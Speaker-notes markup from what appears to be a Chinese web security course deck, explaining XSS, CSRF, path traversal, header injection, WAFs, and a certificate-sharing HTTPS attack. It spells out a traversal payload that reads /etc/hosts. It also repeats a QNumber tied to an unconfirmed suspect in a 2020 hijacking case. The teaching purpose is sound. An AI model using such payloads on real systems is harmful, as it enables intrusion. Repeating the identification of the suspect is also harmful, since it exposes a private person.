        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507907" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Search”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>框内文本信息反馈回用户页面是什么意思呢？比如说用户输入“价格”这个词，点击查询，从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>端反馈回来的刷新页面常常会将“价格”这个词显示在页面上，比如：您查找的“价格”不存在；您查找的“价格”有如下</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>条记录信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>……</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>等等。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>而如果输入的不是正常的文本，而是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>脚本，页面也会尝试将这个脚本当成文本显示出来，这样就会引发客户端浏览器去执行这段脚本，不是简单的显示。这样就能知道该站点对输入的文本没有进行严格的检查过滤，是存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>攻击漏洞的。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">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不设置</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Cookie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安全属性的原因主要有两种：一种是</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应用开发者不知道安全属性或不愿意使用安全属性；第二种是设置安全属性后应用无法运行。</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B21F77C-4309-462A-A3C3-F142311DBDD3}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="465922" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="465923" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击强迫已登录的受害者的浏览器向一个易受攻击的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>应用程序发送一个请求，然后它再代表受害者执行所选择的有利于攻击者的行为。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>这段描述的关键部分是“强迫已登录的”受害者发送请求。攻击者利用网站对目标用户的信任。 </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上述网页代码中，常量</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TMPLDIR</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指定的是存在文件的目录名，要访问的文件名由查询字符串中的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template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指定，并被赋值给变量</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$tmp1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。脚本使用</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readfile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函数读取指定的文件，然后将其原封不动在放在响应消息中</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="120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执行的结果是页面中显示出</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Linux</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系统配置文件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etc</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/hosts</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中的内容。此是，脚本内拼接成的文件名如下所示：</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var</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/www/example/tmp1/../../../../</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etc</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/hosts%00.html</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其中，</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%00</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为空字节，在</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语言中表示字符串的结束。因此，上述文件名可简化为：</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var</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/www/example/tmp1/../../../../</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etc</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/hosts</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Linux</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系统中，</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表示上一级目录，所以从当前目录（</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var</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/www/example/tmp1/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）开始，经过</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4</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次进入到上一级目录（“</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”）操作后，实际访问的文件为：</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en-US"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Apache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服务器从</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CFG</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脚本中接收的消息头中如果有多个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Location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消息头，就会只将最后一个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Location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消息头作为响应返回。因此，原来的重定向目标就被忽略，取而代之的是换行符后面的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URL</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Apache</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服务器从</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CFG</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脚本中接收的消息头中如果有多个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Location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消息头，就会只将最后一个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Location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消息头作为响应返回。因此，原来的重定向目标就被忽略，取而代之的是换行符后面的</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URL</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A702537-91C8-4F8B-9142-7626BF94862C}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="445442" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="445443" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>恶意文件执行漏洞也称为不安全的远端文件包含漏洞</a:t>
            </a:r>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D471A18-DCD3-421C-A49D-A7D5BCA182D1}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="470018" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="470019" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>查明堆栈跟踪：为程序员提供详尽的信息，说明错误发生前调用了哪些程序或函数。相同的信息还可为计算机罪犯提供函数、对象名称，以及其它设计针对报告错误的系统的攻击的相关情况。 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>状态信息：揭示数据库、字段和表名称</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>在计划实施</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入之类的攻击时，与数据库有关的信息十分重要 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>登录信息：登录失败后，通知用户是否用户</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>或密码出错</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>登录失败可能是由于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>或密码错误造成的。这为一个对关键资产发动暴力攻击的攻击者提供重要信息。 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>授权信息：确认某个文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>如果未获得授权的用户企图访问某个文件，返回的错误消息会告诉她没有取得访问那个资源的授权。如果她是一名试图定位某个包含敏感信息的文件的攻击者，错误消息就为她提供了肯定信息。 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>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其中一个被改的客户是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，一家帮助人们安全地在线进行各种交易的代理网站（讽刺的是，代理域名销售是其业务的重要组成部分）。从星期一晚上</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5:00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开始大约两个小时，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的网站看起来完全不同：其首页被纯文本形式的粗略消息取代。</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通过查看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的域名系统（</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DNS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）记录，可以看到它们指向的是马来西亚的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Internet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地址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-111.90.149.49</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tooltip="View all posts in Let's Encrypt"/>
              </a:rPr>
              <a:t>Let's Encrypt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lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://letsencrypt.org/</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作为一个公共且免费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的项目逐渐被广大用户传播和使用，是由</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Mozilla</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Cisco</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Akamai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IdenTrust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EFF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等组织人员发起，主要的目的也是为了推进网站从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向</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过度的进程，目前已经有越来越多的商家加入和赞助支持。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Let's Encrypt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免费</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证书的出现，也会对传统提供付费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证书服务的商家有不小的打击。到目前为止，</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tooltip="View all posts in Let's Encrypt"/>
              </a:rPr>
              <a:t>Let's Encrypt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获得</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IdenTrust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交叉签名，这就是说可以应用且支持包括</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FireFox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Chrome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在内的主流浏览器的兼容和支持，虽然目前是公测阶段，但是也有不少的用户在自有网站项目中正式使用起来。</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虽然目前</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Let's Encrypt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免费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证书默认是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90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天有效期，但是我们也可以到期自动续约，不影响我们的尝试和使用。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其中一个被改的客户是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，一家帮助人们安全地在线进行各种交易的代理网站（讽刺的是，代理域名销售是其业务的重要组成部分）。从星期一晚上</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5:00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开始大约两个小时，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的网站看起来完全不同：其首页被纯文本形式的粗略消息取代。</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通过查看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的域名系统（</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DNS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）记录，可以看到它们指向的是马来西亚的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Internet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地址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-111.90.149.49</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28793118-89C1-46D5-A5F9-D5DB293598F6}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778690" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4343400"/>
            <a:ext cx="5486400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>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通用与专用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>很多单位需要重点保护的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器</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https://www.qianxin.com/product/detail/pid/19</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>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应用防火墙系统是以网站或应用系统为核心的安全产品，通过对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或</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攻击行为进行分析并拦截，有效的降低网站安全风险。产品主要部署在网站服务器的前方。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:b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应用防火墙系统可以有效地缓解网站及</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应用系统面临如</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0WASP TOP 10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中定义的常见威胁；可以快速地应对恶意攻击者对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业务带来的冲击。让网站免遭</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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>攻击侵扰并对网站代码进行合理加固</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" kern="120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应用防火墙提供了细粒度的特征库，产品支持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协议效验、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特征库（基于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OWASP TOP 10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标准）、爬虫规则、防盗链规则、跨站请求规则、文件上传</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下载、敏感信息、弱密码检测等多种细粒度检测的特征库匹配规则。</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反向代理模式下，将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部署在了服务器之前，用户访问时，不知道服务器的的具体存在，会直接访问到</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，如果是恶意请求或攻击，访问会被直接拦截，正常的访问</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才会向服务器转发请求。这是最常见的一种部署模式。</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通常只有硬件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才会部署为透明代理。透明代理模式下，用户访问时不知道</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的存在，访问会直接指向真实服务器，但流量到达服务器之前，会隐性的被</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过滤，只有正常的访问才会被放行到服务器，恶意的访问、攻击都会被拦截。</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具体将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部署在网络中的什么位置，需根据自己情况而定。</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比如网站、服务器可能有多台，在服务器之前，是部署着另一台服务器，用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做为路由转发的，那么接入软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之时，就会有三种选择：将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置于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之前，部署在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所在服务器；将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置于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之后，同样部署在</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部署在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之后，但放在各网站服务器。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很多时候，被保护网站很重要、业务不可中断。这种需求之下，要求</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的接入需要实现高可用、高稳定。为了达到这种目的，如果是部署软件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，则需采用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LB/Nginx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配置双机热备，如果一台</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发生异常，可被直接跳过；如果部署硬件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，则需要硬件具备故障</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Bypass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功能，无论断电、系统死机、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异常，都不影响正常业务。</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无论双机热备或是硬件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Bypass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最终目的都是：</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WAF</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万一故障，业务仍不中断。</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https://www.freebuf.com/articles/web/200180.html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hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.freebuf.com/vuls/211822.html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https://delta.navisec.io/a-pentesters-guide-part-5-unmasking-wafs-and-finding-the-source/</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fld id="{98D00620-6178-46C5-8F20-2517766D17DD}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151555" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1515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要按年度更新</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要按年度更新</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7AC0CFEC-F992-41B9-96E5-29E055FBD6AC}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="443394" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="443395" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的产品</a:t>
            </a:r>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DVWA</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Damn Vulnerable Web Application</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）是一款渗透测试的演练系统，如果需要入门，并且找不到合适的靶机，那推荐从</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DVWA</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入手。</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DVWA</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其实就是一个</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php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网站，需要事先在自己的电脑上搭好</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服务器（</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Apache+PHP+MySQL</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），之后到</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DVWA</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的官网（</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http://www.dvwa.co.uk/</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）选择下载得到</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DVWA-master.zip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，解压之后放到本地</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php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的网站目录（如</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="pt-BR" altLang="zh-CN" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>htdoc</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要按年度更新</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清华大学段海新教授的学术报告：端到端通信中的中间盒子</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>—</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>祝福还是诅咒？</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https://mp.weixin.qq.com/s/bPkWnzdYDFoJ89Tz6dS7jg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>熟悉的陌生人攻击原理：</a:t>
            </a:r>
            <a:endParaRPr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由于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网站的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部署比较复杂而且技术仍在进一步发展，共享证书的多个网站之间难免会出现配置故障或者策略不一致的现象。</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清华大学</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奇安信集团联合研究中心的研究人员发现，这种证书共享的场景下存在较大的安全风险。如果共享证书的多个网站中有一个网站的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的配置不安全，即使配置安全的网站也可能受到攻击。也就是我们常说的木桶效应，或者说一个链条的强度由最弱的一环决定。</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在著名的漏洞挖掘比赛</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GeekPwn</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2019</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年的竞赛中，清华大学</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奇安信集团联合研究中心的研究人员获一等奖的项目“熟悉的陌生人”攻击就是这个原理。</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在主持人黄健翔和全场观众的见证下，参赛队员在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分钟内劫持了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配置完善的某知名网站，实现了加密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保护下的用户名和口令的窃取、传输的网页内容的修改，</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成功劫持了</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环境下的二维码应用下载和企业邮箱</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>登录过程</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>等</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攻击。攻击原理如图所示。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Server A</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按照</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当前的最佳安全实践配置，本来是没有安全漏洞的；但是由于它和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Server B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共享一个证书，但是安全配置上存在缺陷（比如没有配置</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HSTS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）。于是攻击者可以对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Server A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和客户端浏览器之间的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实现中间人攻击，使之降级成为明文传输的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，从而实现传输内容的监听和篡改。</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en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://mp.weixin.qq.com/s/itebKMdJgw7yXxXuolsXqQ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>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是为保护“端到端”安全通信而设计的协议，用于保护数据的隐私性、完整性和可靠性。近年来，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已越来越多地部署于各类网站，例如银行、电子商务平台等，是当前互联网的基石。而此项研究证实了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 PKI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加密通信的又一个严重的安全威胁，并提出了针对此类攻击的缓解方案，得到了学术专家和厂商的认可。目前，研究者已经将发现的漏洞报告给受影响的厂商，并提出了降低风险的解决方案。</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清华大学段海新教授的学术报告：端到端通信中的中间盒子</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>—</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>祝福还是诅咒？</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https://mp.weixin.qq.com/s/lRdVqBKlR708tGGXQxjUWA</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要按年度更新</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https://mp.weixin.qq.com/s/lRdVqBKlR708tGGXQxjUWA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://www.cnblogs.com/xmxit-liu/p/12945785.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://www.cnblogs.com/animo-2020/p/12797138.html</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https://www.secrss.com/articles/18176</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2020.3.26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国内部分地区网络出现中间人攻击：</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、京东等被劫持</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蓝点网</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月</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日晚间消息，据蓝点网网友反馈有攻击者正在大规模的发起中间人攻击劫持京东和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等网站，目前受影响的主要是部分地区用户，但涉及所有运营商。</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此次攻击似乎与路由广播有关，通过骨干网络进行劫持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443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端口，目前经测试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DNS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系统解析是完全正常的。</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例如中国移动、中国联通、中国电信以及教育网均可复现劫持问题，而国外网络访问这些站点并未出现异常情况。</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由于攻击者使用的自签名证书不被所有操作系统以及浏览器信任，因此用户访问这些网站时可能会出现安全警告。</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从目前攻击情况来看此次发起攻击的黑客很可能是初学者，而攻击目的很有可能只是在测试但没想到规模如此大。</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https://www.secrss.com/articles/18176</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2020.3.26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国内部分地区网络出现中间人攻击：</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、京东等被劫持</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大量用户无法正常访问京东和</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从目前网上查询的信息可以看到此次攻击涉及最广的是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GitHub.io</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，其次用户访问京东等国内知名网站亦会报错。</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查看证书信息可以发现这些网站的证书被攻击者使用的自签名证书代替，导致浏览器无法信任从而阻止用户访问。</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自签名证书显示证书的制作者昵称为心即山灵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(QQ 346608453)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，这位心即山灵看起来就是此次攻击的始作俑者。</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所幸目前全网绝大多数网站都已经开启加密技术对抗劫持，因此用户访问会被阻止而不会被引导到钓鱼网站上去。</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如果网站没有采用加密安全链接的话可能会跳转到攻击者制作的钓鱼网站，若输入账号密码则可能会被直接盗取。</a:t>
            </a:r>
            <a:endPar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注 ：此</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>QQ</a:t>
            </a:r>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号从此前某数据库里可检索出使用者为某校高中生，不过尚不清楚是高中在校生还是已经从该校毕业。</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注</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="1"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：目前关于黑客身份还在多方追踪中尚未确定，至于是高中生还是已经毕业的学生或者其他身份暂时还未知。</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https://www.secrss.com/articles/18176</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2020.3.26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国内部分地区网络出现中间人攻击：</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GitHub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、京东等被劫持</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被劫持的京东</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="1"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1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>图片来自</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="1" u="none" strike="noStrike" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>unixeno</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>)</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https://www.secrss.com/articles/18363</a:t>
